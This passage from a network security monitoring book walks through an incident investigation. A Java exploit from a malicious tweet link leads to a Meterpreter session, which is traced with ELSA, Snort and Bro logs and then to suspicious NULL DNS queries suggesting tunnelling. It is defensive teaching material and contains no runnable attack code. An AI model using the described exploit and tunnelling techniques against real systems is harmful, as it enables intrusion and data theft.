<p class="calibre1">most effective containment mechanism involves removing the compromised </p>
<p class="calibre1">systems from the network. </p>
<p class="calibre1">First, disconnect 192.168.3.5 from the network. We should consider </p>
<p class="calibre1">it untrustworthy because we don’t know what the intruder did during </p>
<p class="calibre1">his encrypted OpenSSH session. The CIRT should also determine if any </p>
<p class="calibre1">information on 192.168.3.5 is sensitive, to help decide whether this event </p>
<p class="calibre1">qualifies as a Breach 2 or Breach 1 incident. The differentiation lies in the </p>
<p class="calibre1">importance and sensitivity of the stolen data. </p>
<p class="calibre1"><b class="calibre3">232</b>   Chapter 10</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p267"/>The CIRT should determine if any information taken from 192.168.3.5 </p>
<p class="calibre1">could lead to other intrusions. Are there any accounts that could also be </p>
<p class="calibre1">used to log in to other Vivian’s Pets systems? Are there configuration files </p>
<p class="calibre1">that would enable additional access? Are any business partners or custom-</p>
<p class="calibre1">ers at risk? Involving the business, legal, and other teams may become </p>
<p class="calibre1">necessary as the CIRT evaluates the impact of the intrusion. Ultimately, </p>
<p class="calibre1">192.168.3.5 should be retired because it is no longer a trustworthy plat-</p>
<p class="calibre1">form. This could be a hard lesson for the IT and security staff: When the </p>
<p class="calibre1">Metasploitable developers warn users to keep their distribution off the </p>
<p class="calibre1">Internet, they mean it! </p>
<p class="calibre1"><b class="calibre3">conclusion</b></p>
<p class="calibre1">This chapter walked through a server-side compromise. We utilized several </p>
<p class="calibre1">forms of NSM data to analyze an intrusion targeting two systems in the </p>
<p class="calibre1">Vivian’s Pets test network. By examining alert, session, full content, transac-</p>
<p class="calibre1">tion, and extracted content data, we learned that an intruder stole system </p>
<p class="calibre1">information and a compressed archive associated with MySQL. </p>
<p class="calibre1">We also learned that NSM data can’t answer every question by itself. </p>
<p class="calibre1">Once the intruder leveraged stolen credentials (via the  <i class="calibre4">/etc/passwd</i> and  <i class="calibre4">/etc/</i></p>
<p class="calibre1"> <i class="calibre4">shadow</i> files) to connect via OpenSSH, we couldn’t see the commands he ran, </p>
<p class="calibre1">although we could see derivative actions like uploading an archive via FTP. </p>
<p class="calibre1">Using an NSM tool bundled with Sguil, we rebuilt the stolen archive, </p>
<p class="calibre1">although we could have done the same sort of reassembly using Wireshark </p>
<p class="calibre1">or another tool. </p>
<p class="calibre1">This case introduced the idea of patterns of attack and how to analyze </p>
<p class="calibre1">them using NSM tools and methods. In the next chapter, we’ll turn the </p>
<p class="calibre1">tables slightly and review a client-side compromise. </p>
<p class="calibre1">Server-side Compromise   <b class="calibre3">233</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p268"/><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p269"/><b class="calibre3">11</b></p>
<p class="calibre1"><b class="calibre3">c l i e N T- S i D e   c o M P r o M i S e</b></p>
<p class="calibre1">In the previous chapter’s examples, </p>
<p class="calibre1">an intruder conducted reconnaissance </p>
<p class="calibre1">against remote targets, identified services, </p>
<p class="calibre1">and attacked them. After gaining access to </p>
<p class="calibre1">one system with a vulnerable service, the intruder </p>
<p class="calibre1">archived files of interest and exfiltrated them to a </p>
<p class="calibre1">remote server. All of this activity took place without </p>
<p class="calibre1">the explicit involvement of a user on the Vivian’s Pets </p>
<p class="calibre1">network. </p>
<p class="calibre1">This chapter demonstrates a client-side compromise—one of the other </p>
<p class="calibre1">major categories of malicious network activity you are likely to encounter. </p>
<p class="calibre1">Although this incident involves remote systems, the intruder does not initiate </p>
<p class="calibre1">the attack in the same manner as in a server-side compromise. We will use </p>
<p class="calibre1">similar NSM methodologies to detect and respond to the intrusion. </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p270"/><b class="calibre3">client-side compromise defined</b></p>
<p class="calibre1"> <i class="calibre4">Client-side compromise</i> involves an intruder exploiting an application with </p>
<p class="calibre1">which a user interacts. This application could be a web browser, email client, </p>
<p class="calibre1">media player, or any other program that users rely on for access to network </p>
<p class="calibre1">resources. An attacker might trick a user into visiting a compromised site </p>
<p class="calibre1">and revealing her credentials, or he might simply position himself to take </p>
<p class="calibre1">advantage of a routine that the user follows. </p>
<p class="calibre1">Client-side attacks have been popular since the mid-2000s, when attack-</p>
<p class="calibre1">ers realized that if they could convince a user application to execute (or be </p>
<p class="calibre1">subject to) malicious code, their attacks would be more likely to succeed. </p>
<p class="calibre1">Many organizations devote resources and expertise to countering server-side </p>
<p class="calibre1">attacks, but client-side attacks are much more difficult to stop or even detect. </p>
<p class="calibre1">Figure 11-1 shows a generic attack pattern for a client-side compromise. </p>
<p class="calibre1">1. Victim executes malicious code on </p>
<p class="calibre1">system, after being solicited by intruder</p>
<p class="calibre1">or by innocent computer use. </p>
<p class="calibre1">PHISHING EMAIL</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">OR</p>
<p class="calibre1">WEBSITE VISIT</p>
<p class="calibre1">Website hosting</p>
<p class="calibre1">Victim</p>
<p class="calibre1">malicious code</p>
<p class="calibre1">OR</p>
<p class="calibre1">SOCIAL MEDIA OR OTHER COMMUNICATION</p>
<p class="calibre1">Malicious code</p>
<p class="calibre1">on social media</p>
<p class="calibre1">Victim</p>
<p class="calibre1">or other site</p>
<p class="calibre1">2. Attack method exploits vulnerable application </p>
<p class="calibre1">on victim system to execute code or commands, </p>
<p class="calibre1">Exploited</p>
<p class="calibre1">or run an unwanted malicious application. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder</p>
<p class="calibre1">Victim</p>
<p class="calibre1">3. Malicious code causes victim to reach back to intruder</p>
<p class="calibre1"> <i class="calibre4">Figure 11-1: Client-side compromise at ack pat ern</i></p>
<p class="calibre1">As you can see in Figure 11-1, three of the most popular client-side attacks </p>
<p class="calibre1">involve phishing email, visiting websites, and interacting with social media. </p>
<p class="calibre1">How is this possible? </p>
<p class="calibre1"><b class="calibre3">236</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p271"/>In all three attacks, an intruder creates an unsafe communication of some type. With a phishing email message, perhaps the intruder attaches a </p>
<p class="calibre1">malicious executable, such as a document designed to exploit a vulnerable </p>
<p class="calibre1">application like Microsoft Word or Adobe Reader. Phishing email messages </p>
<p class="calibre1">or social media may also contain links to malicious websites operated by the </p>
<p class="calibre1">intruder specifically to perform attacks. The target site could also be a com-</p>
<p class="calibre1">pletely legitimate one, such as a news or sports page, where an attacker has </p>
<p class="calibre1">inserted malicious code that compromises those who visit the site. </p>
<p class="calibre1">The latest variants of these attacks are called  <i class="calibre4">watering hole</i> or  <i class="calibre4">strategic website compromise</i> attacks. An intruder compromises a website that she expects </p>
<p class="calibre1">her targets to visit, such as a human rights or think tank site. When interested </p>
<p class="calibre1">parties visit the site, malicious code attacks them without their knowledge. </p>
<p class="calibre1">These attacks are fairly devastating because they are not tightly targeted </p>
<p class="calibre1">(the intruder can’t be sure that her intended prey will visit the website), </p>
<p class="calibre1">but they can be very stealthy because victims surfing the Web normally are </p>
<p class="calibre1">unwittingly caught in this trap. </p>
<p class="calibre1">Client-side attacks can result in the same levels of access as server-side </p>
<p class="calibre1">attacks (discussed in Chapter 10). An attempt to exploit a vulnerable appli-</p>
<p class="calibre1">cation, regardless of whether it succeeds, is a Cat 3 incident. If the attack </p>
<p class="calibre1">succeeds and the intruder achieves user-level access, the scenario now quali-</p>
<p class="calibre1">fies as a Cat 2 intrusion. If the intruder gains administrator- or root-level </p>
<p class="calibre1">privileges, we must deal with a Cat 1 intrusion. Once the intruder estab-</p>
<p class="calibre1">lishes a command-and-control channel, it’s Breach 3. And if the intruder </p>
<p class="calibre1">begins stealing data or taking other actions, we could be dealing with a </p>
<p class="calibre1">Breach 2 or even a Breach 1 intrusion. (See Figure 9-5 o<a href="index_split_004.html#p228">n page 194 </a>for intrusion category definitions.) Whatever the category, the goal of the CIRT </p>
<p class="calibre1">is, as always, to quickly determine the extent of the incident and to take </p>
<p class="calibre1">rapid actions to contain the attack and mitigate risk of data loss, alteration, </p>
<p class="calibre1">or degradation. </p>
<p class="calibre1"><b class="calibre3">client-side compromise in action</b></p>
<p class="calibre1">For this chapter’s example, we’ll look at a client-side compromise that takes </p>
<p class="calibre1">place on the Vivian’s Pets network but involves different computers. To </p>
<p class="calibre1">make the situation slightly more complicated, the activity in question will </p>
<p class="calibre1">be monitored by an NSM sensor watching two segments. This is a configu-</p>
<p class="calibre1">ration supported by SO and it seems like a good choice when the hardware </p>
<p class="calibre1">in question can support the additional load. We’ll see if that decision is jus-</p>
<p class="calibre1">tified! The network appears as shown in Figure 11-2. </p>
<p class="calibre1">With this sensor configuration, the NSM platform will see traffic both </p>
<p class="calibre1">to and from the wireless network and the internal network. (I’ve completely </p>
<p class="calibre1">simulated the network here in order to include the NAT issues discussed </p>
<p class="calibre1">earlier in the book, but they do not play a major role.)</p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">237</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p272"/><img src="index-272_1.png" alt="Image 132" class="calibre2"/></p>
<p class="calibre1">Internet</p>
<p class="calibre1">Tap</p>
<p class="calibre1">Wireless</p>
<p class="calibre1">Network</p>
<p class="calibre1">Tap</p>
<p class="calibre1">NSM</p>
<p class="calibre1">Laptop</p>
<p class="calibre1">Internal</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1">Network</p>
<p class="calibre1"> <i class="calibre4">Figure 11-2: Wireless and internal network segments on Vivian’s Pets network</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Getting the Incident Report from a User</b></i></p>
<p class="calibre1">One afternoon the Vivian’s Pets CIRT receives a call from a concerned user. </p>
<p class="calibre1">She reports logging in to Twitter and searching for messages to her user-</p>
<p class="calibre1">name. She noticed a tweet from an unfamiliar username,  <i class="calibre4">Callbackpnsm</i>, and </p>
<p class="calibre1">the message was a little unsettling. The unknown tweet mentioned “updates </p>
<p class="calibre1">to our health care plan” and provided a link to a site with  <i class="calibre4">healthcarenews</i> in the URL. Curious, she copied and pasted the URL into her Firefox web </p>
<p class="calibre1">browser to take a look. Figure 11-3 shows the suspicious tweet. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-3: Tweet from Cal backpnsm</i></p>
<p class="calibre1">When an unknown or suspicious Twitter user sends a link to an un- </p>
<p class="calibre1">recognized website, most security analysts become nervous. At this point, </p>
<p class="calibre1">the Vivian’s Pets CIRT suspects that the unfortunate user has fallen for a </p>
<p class="calibre1"><b class="calibre3">238</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p273"/><img src="index-273_1.png" alt="Image 133" class="calibre2"/></p>
<p class="calibre1">client-side attack. The CIRT asks if the user recalls seeing anything suspi-</p>
<p class="calibre1">cious after visiting the URL. The user replies that she saw something about </p>
<p class="calibre1">a Java installation, and when she clicked through to learn about the health </p>
<p class="calibre1">care update, all she saw was a blank page. </p>
<p class="calibre1">The user became worried that something was wrong, so she decided </p>
<p class="calibre1">to turn to the CIRT to get some help. The CIRT thanks the user for her </p>
<p class="calibre1">report. It’s time to start investigating! </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Starting Analysis with ELSA</b></i></p>
<p class="calibre1">One way to begin the analysis process is to query logs for the IP address in </p>
<p class="calibre1">the tweet. We’ll start with ELSA. </p>
<p class="calibre1"><b class="calibre3">Querying for the IP address</b></p>
<p class="calibre1">First, we’ll make sure that the ELSA query time frame begins before the user </p>
<p class="calibre1">experienced the odd activity, and then we’ll add the IP address in question, </p>
<p class="calibre1">203.0.113.15, to the search bar. The results are shown in Figure 11-4. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-4: Initial ELSA query results for 203.0.113.15</i></p>
<p class="calibre1">ELSA tells us that it has 244 records, but, by default, it limits itself to </p>
<p class="calibre1">100 results. The oldest entry appears first. The results are not encourag-</p>
<p class="calibre1">ing, with mentions of malicious Java applet and Vulnerable Java Version </p>
<p class="calibre1">1.7.x Detected. Seeing 0day JRE 17 metasploit Exploit Class is even worse. </p>
<p class="calibre1">Thankfully, we do now have the victim’s IP address: 172.16.0.37. Rather </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">239</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p274"/><img src="index-274_1.png" alt="Image 134" class="calibre2"/></p>
<p class="calibre1"><img src="index-274_2.png" alt="Image 135" class="calibre2"/></p>
<p class="calibre1">than scroll through multiple pages of output, we select the program element </p>
<p class="calibre1">near the top of the screen to see a summary count of all data sources ELSA </p>
<p class="calibre1">possesses for this IP address. Figure 11-5 shows the result. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-5: ELSA displays data sources for logs for 203.0.113.15. </i></p>
<p class="calibre1">As you can see, Snort alerts dominate the results, although there are </p>
<p class="calibre1">two HTTP records and one Bro connection log record. </p>
<p class="calibre1"><b class="calibre3">Checking the Bro HttP Log</b></p>
<p class="calibre1">Clicking the  <i class="calibre4">bro_http</i> link provides the results shown in Figure 11-6. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-6: ELSA displays Bro HTTP log records for 203.0.113.15. </i></p>
<p class="calibre1">These two events bear the same timestamp in ELSA, but the Bro time-</p>
<p class="calibre1">stamp shows that the top request happened first. That seems a little odd, </p>
<p class="calibre1">given that it’s a request for  <i class="calibre4">healthcarenews/Exploit.jar.pack.gz</i>. The second </p>
<p class="calibre1">record, with a later timestamp, is for the  <i class="calibre4">healthcarenews</i> page itself. </p>
<p class="calibre1">Seeing a download for content titled  <i class="calibre4">Exploit.jar.pack.gz</i> doesn’t inspire </p>
<p class="calibre1">confidence. We need to find out what else happened to this victim system. </p>
<p class="calibre1"><b class="calibre3">Checking Snort alerts</b></p>
<p class="calibre1">Returning to the first open tab in ELSA, we notice the  <i class="calibre4">sig_msg</i> link. Clicking this link creates a new tab with a summary count of each of the Snort alerts </p>
<p class="calibre1">associated with 203.0.113.15, as shown in Figure 11-7. </p>
<p class="calibre1">The summary of observed Snort signatures includes references to the </p>
<p class="calibre1">Metasploit Meterpreter, including the core_channel and stdapi, with Command </p>
<p class="calibre1">Request and Command Response for each. This is not encouraging either. </p>
<p class="calibre1"><b class="calibre3">240</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p275"/><img src="index-275_1.png" alt="Image 136" class="calibre2"/></p>
<p class="calibre1">Metasploit ( <i class="calibre4">http://www.metasploit.com/</i>) is an open source reconnaissance </p>
<p class="calibre1">and exploitation framework created by HD Moore and now supported by </p>
<p class="calibre1">Rapid7 and a team of developers. The Meterpreter is a Metasploit  <i class="calibre4">payload</i>, </p>
<p class="calibre1">code used by an attacker after initially gaining access to a target using an </p>
<p class="calibre1">exploit delivered by another Metasploit module. Terms like core_channel and </p>
<p class="calibre1">stdapi refer to functions and features in the Metasploit suite, and Command </p>
<p class="calibre1">Request and Command Response indicate communication between the attacker’s </p>
<p class="calibre1">system and the victim. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-7: ELSA displays a summary of Snort signatures for 203.0.113.15. </i></p>
<p class="calibre1">The intruder appears to have gained the ability to execute code on the </p>
<p class="calibre1">victim via a Java exploit. </p>
<p class="calibre1"><b class="calibre3">Searching for Other activity</b></p>
<p class="calibre1">Next, we need to determine if this intruder interacted with any other systems. </p>
<p class="calibre1">To accomplish that task, we return to the first tab with all the information for </p>
<p class="calibre1">203.0.113.15 and click the  <i class="calibre4">srcip</i> link. ELSA tells us that only 203.0.113.15 and 172.16.0.37 have records associated with 203.0.113.15, but for good measure, </p>
<p class="calibre1">we also click the  <i class="calibre4">dstip</i> link and get the same results. That means we probably have a handle on all activity involving 203.0.113.15—that IP address did not </p>
<p class="calibre1">communicate with any other system we watch. </p>
<p class="calibre1">Still, that result doesn’t mean that no other activity affected the victim, </p>
<p class="calibre1">172.16.0.37. To investigate that lead, we run a new ELSA query for 172.16.0.37 </p>
<p class="calibre1">and then click the  <i class="calibre4">program</i> link to get a summary count of records. We need </p>
<p class="calibre1">to know what other connections 172.16.0.37 conducted. Figure 11-8 shows </p>
<p class="calibre1">the results. </p>
<p class="calibre1">We take a similar approach to investigating these logs. First, we check </p>
<p class="calibre1">out the Snort alerts, summarize them, and look for new information. Nothing </p>
<p class="calibre1">new appears here, except we see Snort alerts for package management, </p>
<p class="calibre1">probably due to system updates. </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">241</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p276"/><img src="index-276_1.png" alt="Image 137" class="calibre2"/></p>
<p class="calibre1"><img src="index-276_2.png" alt="Image 138" class="calibre2"/></p>
<p class="calibre1"> <i class="calibre4">Figure 11-8: ELSA displays data sources for logs for 172.16.0.37. </i></p>
<p class="calibre1">Next, we look at the dstip information and get results, as shown in </p>
<p class="calibre1">Figure 11-9. (I’ve snipped the results to concentrate on the most pertinent </p>
<p class="calibre1">information.)</p>
<p class="calibre1"> <i class="calibre4">Figure 11-9: ELSA displays a summary of dstip entries for 172.16.0.37. </i></p>
<p class="calibre1">One entry catches our attention. The bottom record shows 10.0.0.99, an </p>
<p class="calibre1">IP address in the Vivian’s Pets internal network. That means there were five </p>
<p class="calibre1">connections between 172.16.0.37 and 10.0.0.99. Are these legitimate? Could </p>
<p class="calibre1">one or more be caused by an intruder abusing 172.16.0.37? </p>
<p class="calibre1">Clicking the IP address 10.0.0.99 tells ELSA to query for records where </p>
<p class="calibre1">10.0.0.99 was the destination IP address and 172.16.0.37 was the source IP </p>
<p class="calibre1">address. Figure 11-10 shows the results. </p>
<p class="calibre1">These records show three SSH connections. All three appear in the </p>
<p class="calibre1">Bro  <i class="calibre4">conn.log</i> file, and two appear as “heuristic detections” in the Bro  <i class="calibre4">notice.log</i> file. These connections could involve transfers of data via a program like </p>
<p class="calibre1">Secure Copy (scp) or interactive logins using SSH. It’s probably worth look-</p>
<p class="calibre1">ing for all activity involving 10.0.0.9, so we run a new query (not shown)</p>
<p class="calibre1"><b class="calibre3">242</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p277"/><img src="index-277_1.png" alt="Image 139" class="calibre2"/></p>
<p class="calibre1">for only that IP address, and group the results by program. They show </p>
<p class="calibre1">121 Snort alerts, 23  <i class="calibre4">conn.log</i> entries, 18  <i class="calibre4">dns.log</i> entries, 2  <i class="calibre4">notice.log</i> entries, and 1  <i class="calibre4">http.log</i> entry. </p>
<p class="calibre1">Using the same investigative steps, we query each of the log types for any-</p>
<p class="calibre1">thing interesting. All of the Snort alerts for 10.0.0.9 appear to be related to </p>
<p class="calibre1">package management, as do the Bro log entries for the rest of the activity. </p>
<p class="calibre1">Is that the end of the case? Was 172.16.0.37 the only victim, and the </p>
<p class="calibre1">SSH connections to 10.0.0.9 normal business activity? Could our NSM plat-</p>
<p class="calibre1">form have missed something? </p>
<p class="calibre1"> <i class="calibre4">Figure 11-10: ELSA displays Bro log records for source IP 172.16.0.37 and destination IP 10.0.0.9. </i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Looking for Missing Traffic</b></i></p>
<p class="calibre1">At this point, we suspect that something may be wrong, and we want to </p>
<p class="calibre1">make sure that the NSM platform is performing as expected. Is our system </p>
<p class="calibre1">up to the task of watching two segments? Could it be dropping traffic? </p>
<p class="calibre1">One way to answer these questions is to check Bro’s  <i class="calibre4">capture_loss.log</i>, which </p>
<p class="calibre1">reports on Bro’s packet-capture performance. Listing 11-1 shows the contents </p>
<p class="calibre1">of the log at the time of this incident. </p>
<p class="calibre1">$ <b class="calibre3">cat /nsm/bro/logs/current/capture_loss.log</b></p>
<p class="calibre1">#separator \x09</p>
<p class="calibre1">#set_separator  , </p>
<p class="calibre1">#empty_field    (empty)</p>
<p class="calibre1">#unset_field    -</p>
<p class="calibre1">#path   capture_loss</p>
<p class="calibre1">#open   2013-03-16-15-02-50</p>
<p class="calibre1">#fields ts      ts_delta        peer    gaps    acks    percent_lost</p>
<p class="calibre1">#types  time    interval        string  count   count   string</p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">243</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p278"/>1363446165.986403       900.000429      sovm-eth2-1     0       0       0.000%</p>
<p class="calibre1">1363446165.992449       900.000470      sovm-eth1-1     0       0       0.000%</p>
<p class="calibre1">1363447065.986807       900.000404      sovm-eth2-1     17963   19964  u89.977%</p>
<p class="calibre1">1363447065.992765       900.000316      sovm-eth1-1     0       0       0.000%</p>
<p class="calibre1"> <i class="calibre4">Listing 11-1: Bro </i> capture_loss .log</p>
<p class="calibre1">The second-to-last entry at u is shocking. It shows that Bro dropped </p>
<p class="calibre1">89.977 percent of the traffic seen on the second sniffing sensor interface. </p>
<p class="calibre1">That could be devastating! (Bro may have run out of memory trying to </p>
<p class="calibre1">track a lot of network activity on an underpowered sensor.) </p>
<p class="calibre1">When monitoring a live interface, Bro must make decisions about which </p>
<p class="calibre1">traffic to inspect and which traffic to ignore, simply to try to keep pace with </p>
<p class="calibre1">the live packet stream. When run against a saved trace, Bro has more time </p>
<p class="calibre1">for processing packets, perhaps offering a more thorough analysis. </p>
<p class="calibre1">Remember that one of the tenets of NSM is to use multiple tools for </p>
<p class="calibre1">collection and analysis, so if one tool fails, different sources of data may </p>
<p class="calibre1">still help you determine what happened. Checking the  <i class="calibre4">/nsm/sensor_data/</i></p>
<p class="calibre1"> <i class="calibre4">sovm-eth2/dailylogs/2013-03-16</i> directory on the NSM platform, we find the </p>
<p class="calibre1">163MB  <i class="calibre4">snort.log.1363441680</i> file, which contains the full content data cap-</p>
<p class="calibre1">tured by Netsniff-ng on the SO NSM platform at the time of the incident. </p>
<p class="calibre1">Because we have a copy of the original traffic on disk, we can run tools </p>
<p class="calibre1">like Bro against it. Netsniff-ng was able to save the full trace because it was </p>
<p class="calibre1">just logging packets straight to disk; it wasn’t doing any inspection or analy-</p>
<p class="calibre1">sis, as Bro tried to do. To determine what Bro might have missed, we can </p>
<p class="calibre1">rerun Bro against the full content data stored on the sensor. The results are </p>
<p class="calibre1">shown in Listing 11-2. </p>
<p class="calibre1">$ <b class="calibre3">bro -r snort.log.1363441680</b></p>
<p class="calibre1">$ <b class="calibre3">ls -al</b></p>
<p class="calibre1">total 203008</p>
<p class="calibre1">drwxrwxr-x  3 sovm sovm      4096 Mar 16 15:54 . </p>
<p class="calibre1">drwxr-xr-x 30 sovm sovm      4096 Mar 16 15:53 .. </p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm     59960 Mar 16 15:54 conn.log</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm  44624347 Mar 16 15:54 dns.logu</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm      1328 Mar 16 15:54 http.log</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm      1446 Mar 16 15:54 notice.log</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm      1128 Mar 16 15:54 notice_policy.log</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm       251 Mar 16 15:54 packet_filter.log</p>
<p class="calibre1">-rw-r--r--  1 sovm sovm 163155548 Mar 16 15:53 snort.log.1363441680</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm      1066 Mar 16 15:54 ssh.log</p>
<p class="calibre1">drwx------  3 sovm sovm      4096 Mar 16 15:54 .state</p>
<p class="calibre1">-rw-rw-r--  1 sovm sovm      1668 Mar 16 15:54 weird.log</p>
<p class="calibre1"> <i class="calibre4">Listing 11-2: Running Bro manual y against full content data</i></p>
<p class="calibre1">The large size of the  <i class="calibre4">dns.log</i> file at u attracts our attention immediately. </p>
<p class="calibre1">How is there a 44MB DNS log for a 163MB packet trace? </p>
<p class="calibre1"><b class="calibre3">244</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p279"/><b class="calibre3">analyzing the bro dns.log file</b></p>
<p class="calibre1">We decide to browse the new  <i class="calibre4">dns.log</i> file manually to see what it reveals. </p>
<p class="calibre1"><b class="calibre3">N o T e : </b> <i class="calibre4">  In early 2013, ELSA author Martin Holste added an </i> import.pl <i class="calibre4"> script </i>(https://</p>
<p class="calibre1">code.google.com/p/enterprise-log-search-and-archive/source/browse/</p>
<p class="calibre1">trunk/elsa/node/import.pl/) <i class="calibre4"> to ELSA to enable manual log additions. For this </i></p>
<p class="calibre1"> <i class="calibre4">example, however, we will combine the earlier ELSA query method with manual log </i></p>
<p class="calibre1"> <i class="calibre4">review, to demonstrate how analysts can use both techniques. </i></p>
<p class="calibre1">We see many normal entries, and then a few that look odd. Listing 11-3 </p>
<p class="calibre1">shows a few sample DNS log entries. </p>
<p class="calibre1">1363444304.701350       fOBMXgho3v5     10.0.0.99       40912   198.51.100.3    53         udp 10453   daisy.ubuntu.comu        1       C_INTERNET      1       Ay       0       NOERROR F    </p>
<p class="calibre1">F       T       T       0       91.189.95.54,91.189.95.55{       5.000000,5.000000</p>
<p class="calibre1">1363444390.148462       Vr7iTah4er6     10.0.0.99|       58566   203.0.113.8}     53      udp 470     labhl2pekjmnzoaoteostk4ms4xfhzma.practicalnsm.comv       1       C_INTERNET      10      </p>
<p class="calibre1">NULLz    -       -       F       F       T</p>
<p class="calibre1">F       0       -       -</p>
<p class="calibre1">1363444390.147170       Vr7iTah4er6     10.0.0.99|       58566   203.0.113.8}     53      udp 58279   vaaaakat2v2.practicalnsm.comw    1       C_INTERNET      10      NULLz    -       -    </p>
<p class="calibre1">F       F       T       F       0       -</p>
<p class="calibre1">-</p>
<p class="calibre1">1363444390.092180       Vr7iTah4er6     10.0.0.99|       58566   203.0.113.8}     53      udp 50552   yrb5fo.practicalnsm.comx 1       C_INTERNET      10      NULLz    -       -       F    </p>
<p class="calibre1">F       T       F       0       -       -</p>
<p class="calibre1"> <i class="calibre4">Listing 11-3: Normal and suspicious entries in the Bro </i> dns .log <i class="calibre4"> file</i></p>
<p class="calibre1">The first record for  <i class="calibre4">daisy.ubuntu.com</i> u looks like a regular DNS query; </p>
<p class="calibre1">someone wants to know the IP address for this site. But the second two records </p>
<p class="calibre1">look odd. Why is someone querying for  <i class="calibre4">labhl2pekjmnzoaoteostk4ms4xfhzma </i></p>
<p class="calibre1"> <i class="calibre4">.practicalnsm.com</i> v,  <i class="calibre4">vaaaakat2v2.practicalnsm.com</i> w, and  <i class="calibre4">yrb5fo.practicalnsm </i></p>
<p class="calibre1"> <i class="calibre4">.com</i> x? Also, unlike the first query for an A record y, these are NULL que-</p>
<p class="calibre1">ries z, which serve no practical purpose. A query for an A record returns </p>
<p class="calibre1">the IP address associated with a domain name. Bro logs the response to the </p>
<p class="calibre1">A record query in the single DNS log {. </p>
<p class="calibre1">Also note the source and destination IP addresses for these queries: </p>
<p class="calibre1">10.0.0.99 | and 203.0.113.8 }. The source IP address 10.0.0.99 was the sys-</p>
<p class="calibre1">tem to which 172.16.0.37 connected three times via SSH. The destination IP </p>
<p class="calibre1">address shares the same net block as 203.0.113.15, the computer hosting a </p>
<p class="calibre1">malicious Java payload. Something odd is happening here. Then we notice </p>
<p class="calibre1">other weird entries that also involve 10.0.0.99 and 203.0.113.8, as shown in </p>
<p class="calibre1">Listing 11-4. These are NULL DNS records as well u. </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">245</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p280"/>1363445036.498672       FVaYW5ltbNh     10.0.0.99       34482   203.0.113.8     53      udp 49394   0euase6eq\xc5v\xc1\xbfp2\xc5h\xdd\xd0kmv\xedt\xc2\xc7\xf8\xea2p\xdc\xe0\xcd\xef\xfd\ xc5t\xed8t\xc4yj\xd1\xdf9qn\xf8\xcf0\xd8\xd480\xe7\xc5\xda\xf97\xe5k.\xebb6\xd3gj\xc76\xdb\xe9\ xdbn\xce\xf1lv\xeb\xbdo\xdayn5gko\xc3tny9\xbf\xe5\xee\xce\xd3\xfb\xee\xc2bd\xd9zj\xbe\xe2z\ xf37\xbe\xcf\xbeh\xfd\xea\xfbe.\xecch\xd4k\xc2cgjqq\xf2\xe5\xd1mj\xcck6mg\xf5z\xc5\xe7sc\xeb\ xea\xfbsc\xe4\xeb\xf9\xe7xq\xd57\xd9t\xe3\xe3\xef\xc0m\xd7fh\xeav\xcc8dgs.r\xfd\xe9\xf8\xca\ xd3\xe9\xc4\xd4u\xect8z\xcc\xf2w\xecyy\xc3\xf7n5bq\xf9\xe1v\xc1e\xcdo\xc8z\xf53\xcecgpwy\xd7\ xfdr\xe5\xfae9iy\xe9\xebz7.practicalnsm.com 1</p>
<p class="calibre1">C_INTERNET      10      NULLu    -       -       F       F       T       F       0       </p>
<p class="calibre1">-       -</p>
